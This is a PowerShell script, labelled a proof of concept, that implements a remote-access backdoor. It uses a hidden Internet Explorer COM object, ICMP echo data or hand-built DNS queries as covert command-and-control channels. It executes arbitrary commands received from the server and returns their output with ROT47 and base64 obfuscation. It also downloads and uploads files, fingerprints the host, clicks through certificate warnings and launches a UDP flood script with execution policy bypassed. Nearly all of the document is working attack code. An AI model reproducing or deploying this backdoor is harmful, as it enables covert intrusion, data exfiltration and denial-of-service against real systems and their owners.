<#
powershell IE backdoor PoC

Uses an IE COM object, ICMP, or DNS as the C2 channel
Requires a php/aspx page with a <> tag in it for web,
Custom DNS or ICMP Server for DNS/ICMP client. 
see http://khr0x40sh.wordpress.com/
for details

PARAMS:
[1] server - url to connect to.  Right now we are just looking for a comment in the source
[2] dwell  - time (sec) between polls
[3] debug  - show the debugging info as well as the IE window
[4] check  - how many cycles before we check for our new server
[5] serverlist - disables the server check or points to our twitter account with serve list
[6] method - ICMP, IE, or DNS egress channel 

Currently file transfer only uses web, this will be addressed in later versions.

Powered by
khr0x40sh
khr0x40sh.wordpress.com
#>
Param(
$server = "192.168.1.2",
$dwell = 5,
$debug = $false,
$check=12,
$serverlist="off",
#$serverlist="http://www.twitter.com/index.php/khr0x40sh",
$method="popIE"
);

[string] $global:data=""
[string] $global:comm=""

function runCMD{
Param(
$cmd_str = "ipconfig"
);
$out = ""

$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "cmd"
$ps.StartInfo.Arguments = "/C " + $cmd_str
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.RedirectStandardError = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
$ps.WaitForExit()
[string] $Out = $ps.StandardOutput.ReadToEnd();
[string] $err = $ps.StandardError.ReadToEnd();

if ($err)
{
    $out = "E:"+$err + $out
}
Write-Host $out.ToString()
$out.ToString()
}

function Rot47 { param ([string] $in)  
    $table = @{}
    for ($i = 0; $i -lt 94; $i++) {
        $table.Add(
            "!`"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_``abcdefghijklmnopqrstuvwxyz{|}~"[$i],
            "PQRSTUVWXYZ[\]^_``abcdefghijklmnopqrstuvwxyz{|}~!`"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO"[$i])
    }
    
    $out = New-Object System.Text.StringBuilder 
    $in.ToCharArray() | %{
        $char = if ($table.ContainsKey($_)) {$table[$_]} else {$_}
        $out.Append($char) | Out-Null
    }
    $out.ToString()
}

function de64
{
	Param([string]$str, $web1=$false);
    if($web1)
    {
        $str = $str.Replace("%2B", "+")
    }
    $fr64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($str))
    $fr47 = Rot47 $fr64 
	return $fr47;
}

function en64
{
	Param([string]$str, $web1 = $false);
    $r47 = Rot47 $str
    [byte[]] $by64 = [System.Text.Encoding]::UTF8.GetBytes($r47)
    [string] $to64 = [System.Convert]::toBase64String($by64)
    if ($web1){$to64 = $to64 -replace '[\+]', "%2B";}
	return $to64;
}

function New-Task([int]$Index,[scriptblock]$ScriptBlock) {
    $ps = [Management.Automation.PowerShell]::Create()
    $res = New-Object PSObject -Property @{
        Index = $Index
        Powershell = $ps
        StartTime = Get-Date
        Busy = $true
        Data = $null
        async = $null
    }

    [Void] $ps.AddScript($ScriptBlock)
    [Void] $ps.AddParameter("TaskInfo",$Res)
    $res.async = $ps.BeginInvoke()
    $res
}

function ConvertTo-UnixTimestamp {
    $epoch = Get-Date -Year 1970 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0
    $input | %{$milliseconds = [math]::truncate($_.ToUniversalTime().Subtract($epoch).TotalSeconds);Write-Output $milliseconds}
}

function randomInt {
Param($small=0, $large=100);
    $seed = Get-Date | ConvertTo-UnixTimeStamp
    $rand = new-object System.Random $seed
    $out = $rand.Next($small,$large)
    $out
}


##################
#  POST params
#####

function pc
{
	[string] $pc = [System.Environment]::MachineName
	return $pc
}

function idu
{
	[string] $serial = serial
	[string] $pc = pc
	[string] $hash = $serial +""+ $pc
	[string] $str = hash $hash "MD5"
	return $str
}
function hash
{
	Param([string]$str, [string]$type);
	$StringBuilder = New-Object System.Text.StringBuilder
	[System.Security.Cryptography.HashAlgorithm]::Create($type).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($str))|%{
	[Void]$StringBuilder.Append($_.ToString("x2"))
	}
	return $StringBuilder.ToString()
}

function serial
{
	[string]$HD = [System.Environment]::CurrentDirectory.SubString(0,1);
	[string] $ret = ""
	
	if ([environment]::OSVersion.Version.Major -lt 6)
	{
		#xp mode
		$str_hd = "win32_logicaldisk.deviceid=`""+$HD+":`""
		$m_hd = new-object System.Management.ManagementObject $str_hd
		$m_hd.Get()
		$ret = $m_hd["VolumeSerialnumber"].ToString()
	} else {
		$query = "SELECT Serialnumber FROM Win32_Volume WHERE Name='"+ $HD +":\\'";
		$m_hd = Get-WMIObject -Query $query
		$ret = $m_hd["SerialNumber"].ToString()
	}
	return $ret
}
#################

##############
# BOT Commands
######
function download
{
Param([string]$UA = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
[string] $source,
[string] $dest);
[string] $status =""
try
{
	# can't force IE to download yet, so using powershell for now
	$client = New-Object System.Net.Webclient
	$client.Headers.Add("user-agent", $UA)
	$client.DownloadFile($source,$dest)
}
catch
{
	$status = "Failed `n"
}
#check to ensure file does exist
If (Test-path $dest)
{
	$status = "File downloaded!"
}
else
{
	$status = $status + "File missing!"
}
#report back download complete
	return $status
}

function upload
{
Param($site,$source);
$site = $site + "/access.php" 

$client = New-Object System.Net.WebClient
$client.Headers.Add("user-agent", $UA)
    if (Test-path $source)
    {
        if(Test-path $source -pathtype container)
        {
            foreach ($f in $source)
            {
                $client.UploadFile($site,$f);
            }
        }
        else
        {
            $client.UploadFile($site,$source)
        }
    }
    else
    {
        #push error message
    }
}

####################
function getServers{
Param($ie1, $serverl);
        $ie1.navigate($serverl)
        
        while($ie1.Busy)
        {
            Sleep 3
        }
        $twitter = $ie1.Document.Body.getElementsByTagName("p")
        $i6 = 0
        [string[]]$t_serv 
        $hash1=""
        try
        {
            foreach($t2 in $twitter)
            {
                if($t2.OuterHTML.ToLower().Contains("entry-content"))
                {
                    $hash1 = $t2.InnerHTML
                    break                 
                }
            }
            $from64_hash = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hash1))
            $t_serv = $from64_hash.Split(';')
        }
        catch
        {
            $t_serv =  {$server}
        }
return $t_serv
}

function popIE{
        $ie = New-Object -COM internetexplorer.application

        $ie.visible = $debug  #visibility set by the debug param
        $t_serv=@("")
        if ($serverlist -ne "off")
        {
            $t_serv = getServers $ie $serverlist
        }
        else
        {
            $t_serv[0] = $server
        }
        
        #[string] $garbage = hash "1qazXSW@" "MD5"
        #[string] $idu = idu
        #$pre="r="+$garbage+"&idu="+$idu
        
        $pre = setPrefix

        $MaxRunspaces = 3
        
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxRunspaces)
        $pool.Open()

        $jobs = @()  
        $ps = @()  
        $wait = @()   
        $k=0
        $i6=0

        while ($true)
        {
            if($i6 -eq $check)
            {
                if ($serverlist -ne "off")
                {
                    $t_serv = getServers $ie $serverlist
                }
                else
                {
                    $t_serv[0] = $server
                }
                $i6=0
            }
            $p1 = pc
        	$p = en64 $p1 $True
        	$t = en64 "10000" $True
        	$c = en64 $global:comm $True
            try {if ($global:data.substring(0,5).Contains("True")){$global:data=$global:data.substring(5,$global:data.Length-5)}}catch{$global:data=""}
            $q = en64 $global:data $True
        	$Data1 = $pre+"&p="+$p+"&t="+$t+"&c="+$c+"&q="+$q
            
            $enc = New-Object System.Text.ASCIIEncoding 
            $pData = $enc.GetBytes($Data1) 
            $brFlgs = 14 #// no history, no read cache, no write cache
            $header = "Content-Type: application/x-www-form-urlencoded"
            $t_serv_new =""
            if ($t_serv.Count -lt 2)
            {              
                $t_serv_new = "http://" + $t_serv[0]
            }
            else
            {
                $r2 = randomInt 0 $t_serv.Count+1 
                $t_serv_new = "http://" + $t_serv[$r2] 
            }
            
            $ie.navigate2($t_serv_new + "/search.php", $brFlags, 0, $pData, $header)
            
            while ($ie.Busy)
            {
                #still loading so let's wait
                Sleep 3
            }
                
                #if we have a cert we need to force accept
                $ieHTML = $ie.Document.url
                if ($ieHTML.Contains("invalid"))
                {
                    $A = $ie.Document.getElementsByTagName("a")
                    foreach ($aa in $A)
                    {
                        if ($aa.innerText.toLower().Contains("continue to this website"))
                        {
                            $aa.Click();
                            break;
                        }
                    }
                }
                else
                {
                    #get our designated tag that contains our code
                    $tags = $ie.Document.getElementsBytagname("pre")
                    foreach ($tag in $tags)
                    {
                        ###TO DO: Move the lot of this into it's own function
                        Write-Verbose "Available Runspaces: $($pool.GetAvailableRunspaces()-1)" 
                        
                        $de64 = de64 $tag.innerText $True
                        
                        getText $de64
                        
                    }
                    #if searching for HTML comment use below:
                }
            Start-Sleep $dwell
            $i6++
        }
}

function popICMP{
#based off of http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response

$icmpClient = new-object System.Net.NetworkInformation.Ping
$options = new-object System.Net.NetworkInformation.PingOptions

$options.DontFragment = $false

$i6=0
$timer=10000
$de64="stop "
while ($true)
{
     if($i6 -eq $check)
     {
         if ($serverlist -ne "off")
         {
            $t_serv = getServers $ie $serverlist
         }
         else
         {
              $t_serv = {$server}
         }
         $i6=0
     }
     
     getText $de64
      
     $p1 = pc
     $p = en64 $p1 $False
     $t = en64 "10000" $False
     $c = en64 $global:comm $False
     $q= en64 $global:data $False
     $pre=setPrefix

    $encM=$pre+"&p="+$p+"&t="+$t+"&c="+$c+"&q="+$q
     
    [byte[]] $msg = [System.Text.Encoding]::UTF8.GetBytes($encM)
    [System.Net.NetworkInformation.PingReply] $reply = $icmpClient.Send($server, $timer, $msg, $options)
    
    [string] $response = [System.Text.Encoding]::UTF8.GetString($reply.Buffer)
    $date = Get-Date
    $de64 = de64 $response $False
    $de64
    
    Start-Sleep $dwell
    $i6++
}

}

function setPrefix
{
[string] $garbage = hash "1qazXSW@" "MD5"
[string] $idu = idu
$pre="r="+$garbage+"&idu="+$idu

return $pre
}

function getText{
Param($de64);
   $switched = $de64.Split(" ")
   switch($switched[0])
   {
       stop{[string]$global:data="";$global:comm="";break}
       kill{Exit;break}
       wipe{"TBD kill and clean";break}
       download{download $de64[1] $de64[2];break}
       upload{
             $path1=""
             for($x=1;$x -lt $switched.Count;$x++)
             {
                 $path1=$path1 + $Switched[$x]
             }
                 upload $t_serv_new $path1
                 break;
             }
             udp{
                                    
                 $de64r = $de64.Replace(" ",",")
                 [string] $src = [Environment]::CurrentDirectory
                 [string] $tsk = $src+"\udpflood.ps1"
                                    
                 $a = New-Object -ComObject Scripting.FileSystemObject
                 $f = $a.GetFile($tsk)
                 $tsk = $f.ShortPath
                 Write-Host $tsk
                 $udp1 = $de64r
                                    
                 if ($item.State -ne "Running")
                 {
                     $item = Start-Job -ScriptBlock {Param($tsk,$udp1); $tsk = "`""+$tsk+"`""; Write-Host $tsk; Write-host $udp1; powershell.exe -exec Bypass $tsk $udp1} -argumentList $tsk,$udp1
                     Get-Job | Receive-Job
                     $item.State
                 }
                     break;
                 }
                 udpoff
                 {
                     if ($item.State -eq "Running")
                     {
                         Stop-Job $item
                     }
                         break;
                     }
                         default{Write-Host $switched[0];$global:data= runCMD $de64; $global:comm = $de64; break;}
                 } 
                 if ($global:data.Contains("True")) #Removes the phantom True that may appear after executing a command line command
                 {
                    if ($global:data.substring(0,4).Contains("True") -and $global:data.Length -gt 7)
                    {
                        [string]$holder = $global:data.ToString()
                        $count = $holder.Length
                        $global:data=$global:data.substring(7,$count-7)
                    }
                    else
                    {
                        $global:data =""
                    }
                 }
}

function popDNS
{
#if we query for X, we should get our command.  We need to pass the IDU somehow...
SendDNSPacket
}

function SendDNSPacket
{
    param($Packet)
    
    While ($true)
    {
        $p = pc
        $pc = en64 $p $false
        $idu = idu
        $gostr=""
        $d=1
        if ($global:data.Length -gt 0)
        { 
            Write-Host $global:data
            $data = en64 $global:data $false
            $comm = en64 $global:comm $false
            if ($data.Length -gt 32)
            {
                $datalen=$data.Length / 32
                $d1=$data.Length
                $d =[math]::ceiling($datalen)
                #$d_64 = en64 $d $false
                for($i=0;$i -lt $d;$i++)
                {
                    $min=($i*32)
                    $max=32
                    if ($i -eq ($d-1))
                    {
                        $max = $d1 - $min-1
                    }
                    #Write-Host $min
                    #Write-Host $max
                    $xyz = $data.Substring($min,$max)
                    #Write-Host $i
                    #Write-Host $xyz
                    $gostr += "$comm.$xyz.$pc.$idu.idu.com`n"
                }
            }
            else
            {
                $datalen = 1
                $gostr="$comm.$d_64.$d.$data.$pc.$idu.idu.com"
            }
        }
        else
        {
            $gostr= "$pc.$idu.idu.com"
        }
        $gostrs=$gostr.split("`n")
        
        $udphost=$server
        $udpport=53
        
        $addr = [System.Net.IPAddress]::Parse($udphost)
                      #Trans ID  std query  
        [Byte[]]$Mess=0x00,0x01,0x01,0x00,0x00
                      #Ans       Auth    Add RR
        [Byte[]]$Mess2= 0x00,0x00,0x00
                                  #no. of questions
        $Mess = $Mess + [Bitconverter]::GetBytes([int]$d) +$Mess2 
        
        
        
        #Create Socket!!!
        $Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
        $Stype = [System.Net.Sockets.SocketType]::Dgram
        $Ptype = [System.Net.Sockets.ProtocolType]::UDP
        $enc = [system.Text.Encoding]::UTF8
        [Byte[]]$fullQ = @() 
         
        #suffix for each q
        #        null     type    class 
        $postS = 0x00,0x00,0x01,0x00,0x01     
        foreach ($go1 in $gostrs)
        {
            if ($go1.Length -gt 0)
            {
                Write-Host $go1
                $subds = $go1.Split('.')
            
                foreach ($s in $subds)
                {
                    $data1 = $enc.GetBytes($s) 
                    $len1 = [bitconverter]::GetBytes($s.Length)
                    $len1 = @($len1[0])
                    
                    $fullQ += $len1 + $data1 
                    #Write-Host $fullQ
                }
                $fullQ += $postS
             }
        }
            $End = New-Object System.Net.IPEndPoint $addr, $udpport;
        	$Sock = New-Object System.Net.Sockets.Socket $Saddrf, $Stype, $Ptype;
        	$Sock.TTL = 26
            $Sock.ReceiveTimeout=3000

        	#connect to socket
        	$Sock.Connect($End);

        	#Conn to socket
        	$Enc = [System.Text.Encoding]::ASCII;
            #[Byte[]]$post = 0x00,0x00,0x01,0x00,0x01 
        	$Buffer = $Mess + $fullQ # + $post #$Enc.GetBytes($Mess);
            #Write-Host $enc.GetString($Buffer)
        	#Send the buffer
            
            
        	
        	$Sent = $Sock.Send($Buffer);
            [byte[]]$buffer2=@(0)*4096
            $Recv = $Sock.Receive($buffer2)
            #Write-Host "$Recv: $buffer2"
            $StartB = $gostrs[0].Length+31
            [int]$diff = [int]$Recv - $StartB
            
            $diff
            [Byte[]]$catch1 = @(0)*$diff
            for($i=0; $i -lt $diff; $i++)
            {
                    $catch1[$i] = $buffer2[$StartB+ $i]
            }
            #Write-Host "$catch1"
            $output1 =$enc.GetString($catch1)
            
            $Sock.Close();
            $fullQ=$null
            $output1 = $output1.trim("")
            $output1 = $output1.trim("`"")
            $c64 = de64 $output1 $false               #de-obfuscate
            getText $c64
            $c64
        
        Start-Sleep $dwell
    }
}

switch($method)
{
    popIE{popIE;break;}      #Uses IE Com object
    popICMP{popICMP;break;}  #ICMP
    popDNS{popDNS;break;}    #DNS 
    #popRaw{popRaw;break;}    #raw packets with rot47 b64 support (future)
}
